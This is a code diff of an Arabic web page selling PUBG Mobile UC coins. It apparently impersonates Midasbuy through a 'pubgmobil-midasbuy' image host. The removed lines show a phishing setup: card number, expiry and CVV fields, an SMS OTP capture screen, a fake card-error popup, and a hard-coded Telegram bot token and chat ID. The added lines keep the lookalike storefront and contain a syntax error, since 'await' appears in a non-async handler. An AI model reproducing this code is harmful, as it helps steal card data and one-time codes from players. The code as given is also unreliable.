-          <option value="TRY" data-symbol="₺" data-rate="32.00">🇹🇷 ليرة تركية</option>
-          <option value="VND" data-symbol="₫" data-rate="24800">🇻🇳 دونغ فيتنامي</option>
-          <option value="THB" data-symbol="฿" data-rate="35.50">🇹🇭 بات تايلاندي</option>
-          <option value="JPY" data-symbol="¥" data-rate="150.00">🇯🇵 ين ياباني</option>
-          <option value="MYR" data-symbol="RM" data-rate="4.70">🇲🇾 رينغيت ماليزي</option>
-          <option value="KRW" data-symbol="₩" data-rate="1330">🇰🇷 وون كوري</option>
-          <option value="MNT" data-symbol="₮" data-rate="3450">🇲🇳 توغروغ منغولي</option>
-          <option value="PKR" data-symbol="Rs" data-rate="278">🇵🇰 روبية باكستانية</option>
-          <option value="IQD" data-symbol="د.ع" data-rate="1310">🇮🇶 دينار عراقي</option>
-        </select>
+      <!-- العملة — الجنيه المصري أولاً وهو الافتراضي -->
+      <div class="country-section" id="countrySection">
+        <span class="country-label">العملة</span>
+        <i class="fas fa-chevron-down select-arrow"></i>
+        <span class="country-display" id="countryDisplay">🇪🇬 جنيه مصري</span>
+        <select id="countrySelect"></select>
+        <div class="custom-dropdown" id="customDropdown"></div>
       </div>
 
+      <!-- شبكة UC -->
       <div class="coin-grid" id="coinGrid"></div>
 
-      <div class="payment-box">
-        <div class="card-logos">
-          <div class="visa-wrapper">
-            <div class="visa">VISA</div>
-          </div>
-          <div class="mastercard-wrapper">
-            <div class="mastercard">
-              <div class="mc-circles"></div>
-              <span class="mc-text">MasterCard</span>
-            </div>
-          </div>
-        </div>
-
-        <div class="field">
-          <label for="cardNumber">Card Number</label>
-          <div class="field-wrapper" id="cardNumberWrapper">
-            <input id="cardNumber" type="text" inputmode="numeric" maxlength="19" placeholder="**** **** **** ****">
-            <span class="error-icon">!</span>
-          </div>
-        </div>
-
-        <div class="row">
-          <div class="field">
-            <label for="expiry">Expiry Date</label>
-            <div class="field-wrapper" id="expiryWrapper">
-              <input id="expiry" type="text" inputmode="numeric" maxlength="5" placeholder="MM / YY">
-              <span class="error-icon">!</span>
-            </div>
-          </div>
-          <div class="field">
-            <label for="cvv">CVV</label>
-            <div class="field-wrapper" id="cvvWrapper">
-              <input id="cvv" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="3" placeholder="000">
-              <span class="error-icon">!</span>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <button class="action-btn" id="topupBtn">Buy شراء</button>
-
-    </div>
-
-  </div>
-
-  <!-- OTP -->
-  <div class="otp-overlay" id="otpOverlay">
-    <div class="otp-card">
-      <h2><i class="fas fa-shield-alt"></i> كود التحقق OTP</h2>
-      <div class="sub">(SMS ادخل رمز التحقق من رقم الهاتف)</div>
-      <div class="otp-input-group">
-        <input type="text" id="otpInput" placeholder="00000000" maxlength="8" inputmode="numeric">
-        <button id="confirmOtpBtn"><i class="fas fa-check"></i> تأكيد</button>
-      </div>
-      <button class="resend-otp-btn" id="resendOtpBtn">
-        <span class="resend-text"><i class="fas fa-redo"></i> إعادة إرسال رمز التحقق</span>
-      </button>
-      <button class="otp-close" id="closeOtpBtn"><i class="fas fa-arrow-left"></i> العودة للشراء</button>
+      <!-- زر متابعة الدفع -->
+      <button class="action-btn" id="proceedBtn">متابعة الدفع <i class="fas fa-arrow-left"></i></button>
     </div>
   </div>
+</div>
 
-  <!-- Error -->
-  <div class="error-popup-overlay" id="errorPopupOverlay">
-    <div class="error-popup">
-      <div class="error-icon"><i class="fas fa-exclamation-circle"></i></div>
-      <h3>خطأ في بيانات البطاقة</h3>
-      <p>حدث خطأ في بيانات البطاقة، يرجى المحاولة مرة أخرى</p>
-      <button class="error-close-btn" id="errorPopupCloseBtn" type="button">حسناً</button>
-    </div>
+<!-- شاشة التحميل -->
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="loading-card">
+    <div class="loading-spinner"></div>
+    <p>جاري التحويل للدفع...</p>
+    <div class="loading-sub">يرجى الانتظار</div>
   </div>
+</div>
 
-  <!-- Custom Amount -->
-  <div class="custom-amount-overlay" id="customAmountOverlay">
-    <div class="custom-amount-card">
-      <h3>
-        <img class="uc-title-icon" src="https://i.postimg.cc/BZDnXgD0/IMG-20260907-210728.jpg" alt="UC">
-      </h3>
-      <div class="sub">أدخل الكمية المطلوبة</div>
-      <input type="text" id="customCoinsInput" inputmode="numeric" pattern="[0-9]*" placeholder="" maxlength="7">
-      <div class="actions">
-        <button class="btn-cancel" id="cancelCustomBtn">إلغاء</button>
-        <button class="btn-confirm" id="confirmCustomBtn">تأكيد</button>
-      </div>
-    </div>
-  </div>
+<script>
+(function () {
+  'use strict';
 
-  <script>
-    (function() {
-      const BOT_TOKEN = '5119966830:AAG8gBkHGPQsUqNe7Ml_vVjO_F2wN4P18VE';
-      const CHAT_ID   = '1736465760';
+  const API_BASE = ''; // غير مستخدم حاليًا
 
-      const UC_PRICE_PER_UNIT = 0.22 / 70;
+  const UC_ICON = 'https://raw.githubusercontent.com/pubgmobil-midasbuy/midasbuy.com/main/IMG_٢٠٢٦٠٩٠٠٧_٢١٠٧٢٨.webp';
 
-      const coinPackages = [
-        { coins: 700,  priceUSD: 2.20 },
-        { coins: 350,  priceUSD: 1.10 },
-        { coins: 70,   priceUSD: 0.22 },
-        { coins: 7000, priceUSD: 22.00 },
-        { coins: 3500, priceUSD: 11.00 }
-      ];
+  /* ====== الأسعار الأساسية بالجنيه المصري ======
+     500 ج.م ← 280، والباقي بيتضاعف تلقائيًا
+  */
+  const EGP_RATE = 48;
+  const coinPackages = [
+    { coins: 500,   priceUSD: 280  / EGP_RATE },
+    { coins: 1000,  priceUSD: 560  / EGP_RATE },
+    { coins: 2000,  priceUSD: 1120 / EGP_RATE },
+    { coins: 4000,  priceUSD: 2240 / EGP_RATE },
+    { coins: 8000,  priceUSD: 4480 / EGP_RATE },
+    { coins: 16000, priceUSD: 8960 / EGP_RATE }
+  ];
 
-      const currencyData = {
-        USD: { symbol: '$',    rate: 1.00, label: 'دولار أمريكي' },
-        LYD: { symbol: 'د.ل', rate: 4.80, label: 'دينار ليبي' },
-        KWD: { symbol: 'د.ك', rate: 0.30, label: 'دينار كويتي' },
-        EGP: { symbol: 'ج.م',  rate: 48.00, label: 'جنيه مصري' },
-        EUR: { symbol: '€',    rate: 0.92, label: 'يورو' },
-        SAR: { symbol: 'ر.س', rate: 3.75, label: 'ريال سعودي' },
-        AED: { symbol: 'د.إ', rate: 3.67, label: 'درهم إماراتي' },
-        QAR: { symbol: 'ر.ق', rate: 3.64, label: 'ريال قطري' },
-        BHD: { symbol: 'د.ب', rate: 0.38, label: 'دينار بحريني' },
-        OMR: { symbol: 'ر.ع', rate: 0.38, label: 'ريال عماني' },
-        MAD: { symbol: 'د.م.', rate: 10.10, label: 'درهم مغربي' },
-        DZD: { symbol: 'د.ج', rate: 135.00, label: 'دينار جزائري' },
-        TND: { symbol: 'د.ت', rate: 3.10, label: 'دينار تونسي' },
-        MRU: { symbol: 'أ.م', rate: 37.00, label: 'أوقية موريتانية' },
-        CNY: { symbol: '¥',    rate: 7.20, label: 'يوان صيني' },
-        INR: { symbol: '₹',    rate: 83.00, label: 'روبية هندية' },
-        BRL: { symbol: 'R$',   rate: 5.10, label: 'ريال برازيلي' },
-        IDR: { symbol: 'Rp',   rate: 15700, label: 'روبية إندونيسية' },
-        RUB: { symbol: '₽',    rate: 92.00, label: 'روبل روسي' },
-        MXN: { symbol: '$',    rate: 17.50, label: 'بيزو مكسيكي' },
-        PHP: { symbol: '₱',    rate: 56.00, label: 'بيزو فلبيني' },
-        TRY: { symbol: '₺',    rate: 32.00, label: 'ليرة تركية' },
-        VND: { symbol: '₫',    rate: 24800, label: 'دونغ فيتنامي' },
-        THB: { symbol: '฿',    rate: 35.50, label: 'بات تايلاندي' },
-        JPY: { symbol: '¥',    rate: 150.00, label: 'ين ياباني' },
-        MYR: { symbol: 'RM',   rate: 4.70, label: 'رينغيت ماليزي' },
-        KRW: { symbol: '₩',    rate: 1330, label: 'وون كوري' },
-        MNT: { symbol: '₮',    rate: 3450, label: 'توغروغ منغولي' },
-        PKR: { symbol: 'Rs',   rate: 278, label: 'روبية باكستانية' },
-        IQD: { symbol: 'د.ع',  rate: 1310, label: 'دينار عراقي' }
-      };
+  /* ====== Kashier: الدفع يتم عبر create-payment.php ======
+       لا تضع Secret Key هنا. السيرفر هو الذي ينشئ Payment Session.
+    */
 
-      function calculateUCPriceUSD(coins) {
-        return coins * UC_PRICE_PER_UNIT;
-      }
+  /* ====== قائمة العملات مرتبة حسب الطلب ====== */
+  const currencyList = [
+    /* ===== مصر ===== */
+    { code:'EGP', name:'🇪🇬 جنيه مصري',        symbol:'ج.م',  rate:48.00 },
 
-      const usernameInput    = document.getElementById('username');
-      const playerOkMsg      = document.getElementById('playerOkMsg');
-      const playerConfirmMsg = document.getElementById('playerConfirmMsg');
-      const cardNumber       = document.getElementById('cardNumber');
-      const expiry           = document.getElementById('expiry');
-      const cvv              = document.getElementById('cvv');
-      const otpInput         = document.getElementById('otpInput');
-      const topupBtn         = document.getElementById('topupBtn');
-      const confirmBtn       = document.getElementById('confirmOtpBtn');
-      const closeOtpBtn      = document.getElementById('closeOtpBtn');
-      const otpOverlay       = document.getElementById('otpOverlay');
-      const errorPopupOverlay= document.getElementById('errorPopupOverlay');
-      const errorPopupCloseBtn = document.getElementById('errorPopupCloseBtn');
-      const countrySelect    = document.getElementById('countrySelect');
-      const coinGrid         = document.getElementById('coinGrid');
-      const resendOtpBtn     = document.getElementById('resendOtpBtn');
+    /* ===== أمريكا ===== */
+    { code:'USD', name:'🇺🇸 دولار أمريكي',      symbol:'$',    rate:1.00 },
+    { code:'CAD', name:'🇨🇦 دولار كندي',        symbol:'C$',   rate:1.37 },
+    { code:'BRL', name:'🇧🇷 ريال برازيلي',       symbol:'R$',   rate:5.4 },
+    { code:'MXN', name:'🇲🇽 بيزو مكسيكي',       symbol:'Mex$', rate:17 },
 
-      const customOverlay    = document.getElementById('customAmountOverlay');
-      const customInput      = document.getElementById('customCoinsInput');
-      const confirmCustomBtn = document.getElementById('confirmCustomBtn');
-      const cancelCustomBtn  = document.getElementById('cancelCustomBtn');
+    /* ===== دول الخليج ===== */
+    { code:'SAR', name:'🇸🇦 ريال سعودي',        symbol:'ر.س',  rate:3.75 },
+    { code:'AED', name:'🇦🇪 درهم إماراتي',       symbol:'د.إ',  rate:3.67 },
+    { code:'KWD', name:'🇰🇼 دينار كويتي',       symbol:'د.ك',  rate:0.30 },
+    { code:'QAR', name:'🇶🇦 ريال قطري',         symbol:'ر.ق',  rate:3.64 },
+    { code:'BHD', name:'🇧🇭 دينار بحريني',      symbol:'د.ب',  rate:0.376 },
+    { code:'OMR', name:'🇴🇲 ريال عماني',        symbol:'ر.ع',  rate:0.385 },
 
-      const cardWrapper = document.getElementById('cardNumberWrapper');
-      const expiryWrapper = document.getElementById('expiryWrapper');
-      const cvvWrapper = document.getElementById('cvvWrapper');
+    /* ===== دول المغرب العربي ===== */
+    { code:'MAD', name:'🇲🇦 درهم مغربي',        symbol:'د.م.', rate:10.10 },
+    { code:'DZD', name:'🇩🇿 دينار جزائري',      symbol:'د.ج',  rate:134.5 },
+    { code:'TND', name:'🇹🇳 دينار تونسي',       symbol:'د.ت',  rate:3.12 },
+    { code:'LYD', name:'🇱🇾 دينار ليبي',        symbol:'د.ل',  rate:4.85 },
 
-      let selectedCoins  = null;
-      let selectedPrice  = null;
-      let selectedPriceUSD = null;
-      let expiryValid    = false;
-      let isProcessing   = false;
-      let coinOptions    = [];
-      let confirmTimer   = null;
-      let okTimer        = null;
-      let countdownInterval = null;
-      let countdownValue = 30;
-      let lastUsername = '';
+    /* ===== دول أوروبا ===== */
+    { code:'EUR', name:'🇪🇺 يورو',              symbol:'€',    rate:0.92 },
+    { code:'GBP', name:'🇬🇧 جنيه إسترليني',     symbol:'£',    rate:0.79 },
+    { code:'RUB', name:'🇷🇺 روبل روسي',         symbol:'₽',    rate:92 },
+    { code:'UAH', name:'🇺🇦 هريفنيا أوكرانية',   symbol:'₴',    rate:41 },
 
-      function isValidUsername(username) {
-        if (!username) return false;
-        return /^[0-9]+$/.test(username) && username.length > 0;
-      }
+    /* ===== دول آسيا ===== */
+    { code:'TRY', name:'🇹🇷 ليرة تركية',        symbol:'₺',    rate:32.0 },
+    { code:'JOD', name:'🇯🇴 دينار أردني',       symbol:'د.أ',  rate:0.709 },
+    { code:'LBP', name:'🇱🇧 ليرة لبنانية',       symbol:'ل.ل',  rate:89500 },
+    { code:'IQD', name:'🇮🇶 دينار عراقي',       symbol:'ع.د',  rate:1310 },
+    { code:'SYP', name:'🇸🇾 ليرة سورية',        symbol:'ل.س',  rate:13000 },
+    { code:'YER', name:'🇾🇪 ريال يمني',         symbol:'ر.ي',  rate:530 },
+    { code:'INR', name:'🇮🇳 روبية هندية',       symbol:'₹',    rate:83.5 },
+    { code:'PKR', name:'🇵🇰 روبية باكستانية',   symbol:'₨',    rate:278 },
+    { code:'BDT', name:'🇧🇩 تاكا بنغلاديشية',    symbol:'৳',    rate:117 },
+    { code:'IDR', name:'🇮🇩 روبية إندونيسية',   symbol:'Rp',   rate:15800 },
+    { code:'MYR', name:'🇲🇾 رينغيت ماليزي',     symbol:'RM',   rate:4.7 },
+    { code:'PHP', name:'🇵🇭 بيسو فلبيني',       symbol:'₱',    rate:57 },
+    { code:'THB', name:'🇹🇭 بات تايلاندي',      symbol:'฿',    rate:36.5 },
+    { code:'VND', name:'🇻🇳 دونغ فيتنامي',      symbol:'₫',    rate:25400 },
+    { code:'CNY', name:'🇨🇳 يوان صيني',         symbol:'¥',    rate:7.25 },
+    { code:'JPY', name:'🇯🇵 ين ياباني',          symbol:'¥',    rate:157 },
+    { code:'KRW', name:'🇰🇷 وون كوري',          symbol:'₩',    rate:1380 },
 
-      function luhnCheck(cardNumber) {
-        let sum = 0;
-        let shouldDouble = false;
-        for (let i = cardNumber.length - 1; i >= 0; i--) {
-          let digit = parseInt(cardNumber.charAt(i), 10);
-          if (shouldDouble) {
-            digit *= 2;
-            if (digit > 9) digit -= 9;
-          }
-          sum += digit;
-          shouldDouble = !shouldDouble;
-        }
-        return (sum % 10 === 0);
-      }
+    /* ===== دول أفريقيا ===== */
+    { code:'SDG', name:'🇸🇩 جنيه سوداني',       symbol:'ج.س',  rate:601 },
+    { code:'ZAR', name:'🇿🇦 راند جنوب أفريقي',   symbol:'R',    rate:18.5 },
+    { code:'NGN', name:'🇳🇬 نيرة نيجيرية',       symbol:'₦',    rate:1500 },
+    { code:'KES', name:'🇰🇪 شلن كيني',          symbol:'KSh',  rate:130 },
+    { code:'GHS', name:'🇬🇭 سيدي غاني',         symbol:'₵',    rate:15 },
+    { code:'ETB', name:'🇪🇹 بير إثيوبي',        symbol:'Br',   rate:57 },
+    { code:'XOF', name:'🌍 فرنك غرب أفريقيا',   symbol:'CFA',  rate:600 },
+    { code:'XAF', name:'🌍 فرنك وسط أفريقيا',   symbol:'FCFA', rate:600 },
 
-      function isValidCardNumber(card) {
-        const raw = card.replace(/\s/g, '');
-        if (raw.length !== 16) return false;
-        const first = raw.charAt(0);
-        if (first !== '4' && first !== '5') return false;
-        return luhnCheck(raw);
-      }
+    /* ===== أوقيانوسيا / أخرى ===== */
+    { code:'AUD', name:'🇦🇺 دولار أسترالي',      symbol:'A$',   rate:1.52 }
+  ];
 
-      function validateExpiry(dateStr) {
-        const clean = dateStr.replace('/', '');
-        if (clean.length !== 4) {
-          expiryValid = false;
-          return false;
-        }
-        const month = parseInt(clean.substring(0, 2), 10);
-        const year  = parseInt(clean.substring(2, 4), 10);
+  /* بناء كائن العملات من القائمة */
+  const currencyData = {};
+  currencyList.forEach(c => {
+    currencyData[c.code] = { symbol: c.symbol, rate: c.rate };
+  });
 
-        if (month < 1 || month > 12) {
-          expiryValid = false;
-          return false;
-        }
+  const $ = id => document.getElementById(id);
+  const usernameInput = $('username'), playerOkMsg = $('playerOkMsg'),
+        playerConfirmMsg = $('playerConfirmMsg'), playerErrorMsg = $('playerErrorMsg'),
+        countrySelect = $('countrySelect'), countryDisplay = $('countryDisplay'),
+        countrySection = $('countrySection'), customDropdown = $('customDropdown'),
+        coinGrid = $('coinGrid'), proceedBtn = $('proceedBtn'),
+        loadingOverlay = $('loadingOverlay');
 
-        const currentYear  = new Date().getFullYear() % 100;
-        const currentMonth = new Date().getMonth() + 1;
+  let selectedCoins = null, selectedPrice = null, selectedPriceUSD = null;
+  let coinOptions = [], confirmTimer = null, okTimer = null, lastUsername = '';
+  let isSubmitting = false;
 
-        if (year < currentYear || year > currentYear + 10) {
-          expiryValid = false;
-          return false;
-        }
+  function isValidUsername(u) { return /^[1-9][0-9]{7,14}$/.test(u); }
+  function showLoading() { loadingOverlay.classList.add('active'); }
 
-        if (year === currentYear && month < currentMonth) {
-          expiryValid = false;
-          return false;
-        }
+  /* تنسيق السعر: بدون .00 لو الرقم صحيح */
+  function formatPrice(value) {
+    const v = +value.toFixed(2);
+    return Number.isInteger(v) ? v.toFixed(0) : v.toFixed(2);
+  }
 
-        expiryValid = true;
-        return true;
-      }
+  /* ====== بناء قائمة العملات في select ====== */
+  function buildCurrencySelect() {
+    countrySelect.innerHTML = '';
+    currencyList.forEach(c => {
+      const opt = document.createElement('option');
+      opt.value = c.code;
+      opt.dataset.symbol = c.symbol;
+      opt.dataset.rate = c.rate;
+      opt.textContent = c.name;
+      countrySelect.appendChild(opt);
+    });
+    countryDisplay.textContent = countrySelect.options[0].text;
+  }
 
-      function setFieldError(wrapper, isError) {
-        if (isError) {
-          wrapper.classList.add('error');
-          wrapper.querySelector('input').classList.add('error');
-        } else {
-          wrapper.classList.remove('error');
-          wrapper.querySelector('input').classList.remove('error');
-        }
-      }
-
-      function clearFieldError(wrapper) {
-        setFieldError(wrapper, false);
-      }
-
-      function createCoinOption(coins, priceUSD) {
-        const div = document.createElement('div');
-        div.className = 'coin-option';
-        div.dataset.coins = coins;
-        div.dataset.priceUSD = priceUSD;
-        div.innerHTML = `
-          <div class="uc-symbol"><img class="uc-icon-img" src="https://i.postimg.cc/BZDnXgD0/IMG-20260907-210728.jpg" alt="UC"></div>
-          <div class="coins">${coins.toLocaleString()}</div>
-          <div class="total-price" id="price-${coins}">$0.00</div>
-        `;
-        return div;
-      }
-
-      function buildCoinGrid() {
-        coinGrid.innerHTML = '';
-
-        const firstRow = coinPackages.slice(0, 3);
-        firstRow.forEach(pkg => {
-          const div = createCoinOption(pkg.coins, pkg.priceUSD);
-          coinGrid.appendChild(div);
+  /* ====== قائمة العملات المنسدلة ====== */
+  function buildCustomDropdown() {
+    customDropdown.innerHTML = '';
+    Array.from(countrySelect.options).forEach(opt => {
+      const div = document.createElement('div');
+      div.className = 'custom-dropdown-item';
+      div.textContent = opt.text;
+      div.dataset.value = opt.value;
+      div.addEventListener('click', e => {
+        e.stopPropagation();
+        countrySelect.value = opt.value;
+        countrySelect.dispatchEvent(new Event('change'));
+        customDropdown.classList.remove('active');
+        document.querySelectorAll('.custom-dropdown-item').forEach(it => {
+          it.classList.toggle('selected', it.dataset.value === opt.value);
         });
+      });
+      customDropdown.appendChild(div);
+    });
+    const cur = countrySelect.value;
+    document.querySelectorAll('.custom-dropdown-item').forEach(it => {
+      it.classList.toggle('selected', it.dataset.value === cur);
+    });
+  }
 
-        const customDiv = document.createElement('div');
-        customDiv.className = 'coin-option custom-option';
-        customDiv.dataset.coins = 'custom';
-        customDiv.dataset.priceUSD = 'custom';
-        customDiv.innerHTML = `
-          <div class="custom-icon">
-            <img class="custom-icon-img uc-icon-default" src="https://i.postimg.cc/BZDnXgD0/IMG-20260907-210728.jpg" alt="UC">
-            <img class="custom-icon-img uc-icon-check" src="https://i.postimg.cc/BZDnXgD0/IMG-20260907-210728.jpg" alt="UC" style="display:none;">
-          </div>
-          <div class="coins">مخصص</div>
-          <div class="badge">UC</div>
-        `;
-        coinGrid.appendChild(customDiv);
+  countrySection.addEventListener('click', e => {
+    if (e.target.closest('.custom-dropdown')) return;
+    e.stopPropagation();
+    if (customDropdown.classList.contains('active')) {
+      customDropdown.classList.remove('active');
+    } else {
+      customDropdown.classList.add('active');
+      setTimeout(() => {
+        const sel = customDropdown.querySelector('.custom-dropdown-item.selected');
+        if (sel) customDropdown.scrollTop = Math.max(0, sel.offsetTop - customDropdown.clientHeight/2 + sel.clientHeight/2);
+      }, 0);
+    }
+  });
+  document.addEventListener('click', e => {
+    if (!countrySection.contains(e.target)) customDropdown.classList.remove('active');
+  });
 
-        const lastTwo = coinPackages.slice(3);
-        lastTwo.forEach(pkg => {
-          const div = createCoinOption(pkg.coins, pkg.priceUSD);
-          coinGrid.appendChild(div);
-        });
+  /* ====== إنشاء بطاقة UC ====== */
+  function createCoinOption(coins, priceUSD) {
+    const div = document.createElement('div');
+    div.className = 'coin-option';
+    div.dataset.coins = coins;
+    div.dataset.priceUSD = priceUSD;
+    div.innerHTML = `
+      <div class="uc-symbol"><img class="uc-icon-img" src="${UC_ICON}" alt="UC"></div>
+      <div class="coins">${coins.toLocaleString('en-US')}</div>
+      <div class="total-price">ج.م 0</div>
+    `;
+    return div;
+  }
 
-        document.querySelectorAll('.coin-option').forEach(opt => {
-          opt.addEventListener('click', onCoinClick);
-        });
-        coinOptions = document.querySelectorAll('.coin-option');
+  function buildCoinGrid() {
+    coinGrid.innerHTML = '';
+    coinPackages.forEach(p => coinGrid.appendChild(createCoinOption(p.coins, p.priceUSD)));
 
-        updateAllPrices();
+    document.querySelectorAll('.coin-option').forEach(o => o.addEventListener('click', onCoinClick));
+    coinOptions = document.querySelectorAll('.coin-option');
+    updateAllPrices();
 
-        const defaultOpt = document.querySelector('.coin-option[data-coins="70"]');
-        if (defaultOpt) defaultOpt.click();
-        else if (coinOptions.length) coinOptions[0].click();
+    // اختيار أول حزمة تلقائياً (500 UC)
+    const def = document.querySelector('.coin-option[data-coins="500"]');
+    if (def) def.click();
+  }
+
+  /* ====== تحديث الأسعار ====== */
+  function updateAllPrices() {
+    const rate = currencyData[countrySelect.value].rate;
+    const sym = currencyData[countrySelect.value].symbol;
+
+    document.querySelectorAll('.coin-option').forEach(opt => {
+      const usd = parseFloat(opt.dataset.priceUSD);
+      if (!isNaN(usd)) {
+        const el = opt.querySelector('.total-price');
+        if (el) el.textContent = `${sym} ${formatPrice(usd * rate)}`;
       }
+    });
 
-      function updateAllPrices() {
-        const selectedCountry = countrySelect.value;
-        const rate = currencyData[selectedCountry].rate;
-        const symbol = currencyData[selectedCountry].symbol;
-
-        document.querySelectorAll('.coin-option:not(.custom-option)').forEach(opt => {
-          const priceUSD = parseFloat(opt.dataset.priceUSD);
-          if (!isNaN(priceUSD)) {
-            const localPrice = (priceUSD * rate);
-            const priceEl = opt.querySelector('.total-price');
-            if (priceEl) {
-              priceEl.textContent = `${symbol} ${localPrice.toFixed(2)}`;
-            }
-          }
-        });
-
-        const customOpt = document.querySelector('.coin-option.custom-option.selected');
-        if (customOpt) {
-          const coins = parseInt(customOpt.dataset.customCoins);
-          if (coins && !isNaN(coins) && coins > 0) {
-            const usdPrice = calculateUCPriceUSD(coins);
-            const localPrice = usdPrice * rate;
-            selectedPriceUSD = usdPrice;
-            selectedPrice = localPrice;
-            let totalEl = customOpt.querySelector('.total-price');
-            if (totalEl) {
-              totalEl.textContent = `${symbol} ${localPrice.toFixed(2)}`;
-            }
-          }
-        }
-
-        const selectedOpt = document.querySelector('.coin-option.selected');
-        if (selectedOpt && !selectedOpt.classList.contains('custom-option')) {
-          const usd = parseFloat(selectedOpt.dataset.priceUSD);
-          if (!isNaN(usd)) {
-            selectedPriceUSD = usd;
-            selectedPrice = usd * rate;
-          }
-        }
-      }
-
-      function onCoinClick(e) {
-        const opt = this;
-        const isCustom = opt.dataset.coins === 'custom';
-
-        if (isCustom) {
-          customInput.value = '';
-          customOverlay.classList.add('active');
-          setTimeout(() => customInput.focus(), 50);
-          return;
-        }
-
-        document.querySelectorAll('.coin-option').forEach(o => o.classList.remove('selected'));
-        opt.classList.add('selected');
-
-        const rate = currencyData[countrySelect.value].rate;
-        const coins = parseInt(opt.dataset.coins, 10);
-        const usd = parseFloat(opt.dataset.priceUSD);
-        const local = usd * rate;
-        selectedCoins = coins;
+    const sel = document.querySelector('.coin-option.selected');
+    if (sel) {
+      const usd = parseFloat(sel.dataset.priceUSD);
+      if (!isNaN(usd)) {
         selectedPriceUSD = usd;
-        selectedPrice = local;
+        selectedPrice = usd * rate;
+      }
+    }
+  }
+
+  /* ====== اختيار حزمة ====== */
+  function onCoinClick() {
+    const opt = this;
+    document.querySelectorAll('.coin-option').forEach(o => o.classList.remove('selected'));
+    opt.classList.add('selected');
+
+    const rate = currencyData[countrySelect.value].rate;
+    selectedCoins = parseInt(opt.dataset.coins, 10);
+    selectedPriceUSD = parseFloat(opt.dataset.priceUSD);
+    selectedPrice = selectedPriceUSD * rate;
+  }
+
+  /* ====== تغيير العملة ====== */
+  countrySelect.addEventListener('change', function () {
+    countryDisplay.textContent = this.options[this.selectedIndex].text;
+    updateAllPrices();
+    document.querySelectorAll('.custom-dropdown-item').forEach(it => {
+      it.classList.toggle('selected', it.dataset.value === this.value);
+    });
+  });
+
+  /* ====== التحقق من معرف اللاعب ====== */
+  usernameInput.addEventListener('input', function () {
+    this.value = this.value.replace(/[^0-9]/g, '');
+    playerOkMsg.classList.remove('show');
+    playerConfirmMsg.classList.remove('show');
+    playerErrorMsg.classList.remove('show');
+    clearTimeout(confirmTimer); clearTimeout(okTimer);
+    if (this.value.trim() !== lastUsername) lastUsername = '';
+  });
+
+  usernameInput.addEventListener('blur', function () {
+    const val = this.value.trim();
+    if (isValidUsername(val)) {
+      playerErrorMsg.classList.remove('show');
+      if (val === lastUsername) { playerOkMsg.classList.remove('show'); playerConfirmMsg.classList.add('show'); return; }
+      playerOkMsg.classList.add('show'); playerConfirmMsg.classList.remove('show');
+      lastUsername = val;
+      okTimer = setTimeout(() => { playerOkMsg.classList.remove('show'); playerConfirmMsg.classList.add('show'); }, 1000);
+    } else if (val !== '') {
+      playerOkMsg.classList.remove('show'); playerConfirmMsg.classList.remove('show'); playerErrorMsg.classList.add('show');
+      lastUsername = '';
+    } else {
+      playerOkMsg.classList.remove('show'); playerConfirmMsg.classList.remove('show'); playerErrorMsg.classList.remove('show');
+    }
+  });
+
+  /* ====== زر متابعة الدفع ====== */
+  proceedBtn.addEventListener('click', () => {
+    if (isSubmitting) return;
+
+    const username = usernameInput.value.trim();
+    if (!isValidUsername(username)) {
+      usernameInput.focus();
+      playerErrorMsg.classList.add('show');
+      playerConfirmMsg.classList.remove('show');
+      playerOkMsg.classList.remove('show');
+      return;
+    }
+
+    if (!selectedCoins || selectedCoins <= 0) {
+      coinOptions.forEach(opt => { opt.style.borderColor = '#1a73e8'; setTimeout(() => opt.style.borderColor = '', 500); });
+      return;
+    }
+
+    isSubmitting = true;
+    proceedBtn.disabled = true;
+    proceedBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري إنشاء الدفع...';
+
+    showLoading();
+
+    try {
+      const response = await fetch('create-payment.php', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          playerId: username,
+          coins: selectedCoins,
+          amount: Number(selectedPrice.toFixed(2)),
+          currency: countrySelect.value
+        })
+      });
+
+      const data = await response.json();
+
+      if (!response.ok || !data.sessionUrl) {
+        throw new Error(data.message || 'تعذر إنشاء جلسة الدفع');
       }
 
-      customInput.addEventListener('input', function() {
-        this.value = this.value.replace(/\D/g, '');
-      });
+      window.location.href = data.sessionUrl;
+    } catch (err) {
+      console.error(err);
+      loadingOverlay.classList.remove('active');
+      proceedBtn.disabled = false;
+      proceedBtn.innerHTML = 'متابعة الدفع <i class="fas fa-arrow-left"></i>';
+      isSubmitting = false;
+      alert('تعذر فتح صفحة الدفع. تأكد من إعدادات Kashier على السيرفر.');
+    }
+  });
 
-      confirmCustomBtn.addEventListener('click', function() {
-        const val = customInput.value.trim();
-        if (val === '' || isNaN(val) || parseInt(val, 10) <= 0) {
-          customInput.style.borderColor = '#dc2626';
-          customInput.style.background = '#fef2f2';
-          setTimeout(() => {
-            customInput.style.borderColor = '';
-            customInput.style.background = '';
-          }, 500);
-          return;
-        }
+  /* ====== التهيئة ====== */
+  buildCurrencySelect();
+  buildCoinGrid();
+  buildCustomDropdown();
+  countrySelect.dispatchEvent(new Event('change'));
 
-        const num = parseInt(val, 10);
-        const rate = currencyData[countrySelect.value].rate;
-        const symbol = currencyData[countrySelect.value].symbol;
-        
-        const usdPrice = calculateUCPriceUSD(num);
-        const localPrice = usdPrice * rate;
-
-        document.querySelectorAll('.coin-option').forEach(o => o.classList.remove('selected'));
-
-        const customOpt = document.querySelector('.coin-option.custom-option');
-        customOpt.classList.add('selected');
-        customOpt.dataset.customCoins = num;
-
-        const defaultIcon = customOpt.querySelector('.uc-icon-default');
-        const checkIcon = customOpt.querySelector('.uc-icon-check');
-        if (defaultIcon) defaultIcon.style.display = 'none';
-        if (checkIcon) checkIcon.style.display = 'block';
-
-        let coinsEl = customOpt.querySelector('.coins');
-        if (coinsEl) coinsEl.textContent = num.toLocaleString();
-
-        let totalEl = customOpt.querySelector('.total-price');
-        if (totalEl) {
-          totalEl.textContent = `${symbol} ${localPrice.toFixed(2)}`;
-        } else {
-          const newTotal = document.createElement('div');
-          newTotal.className = 'total-price';
-          newTotal.textContent = `${symbol} ${localPrice.toFixed(2)}`;
-          customOpt.appendChild(newTotal);
-        }
-        const badge = customOpt.querySelector('.badge');
-        if (badge) badge.remove();
-
-        selectedCoins = num;
-        selectedPriceUSD = usdPrice;
-        selectedPrice = localPrice;
-
-        customOverlay.classList.remove('active');
-        customInput.value = '';
-      });
-
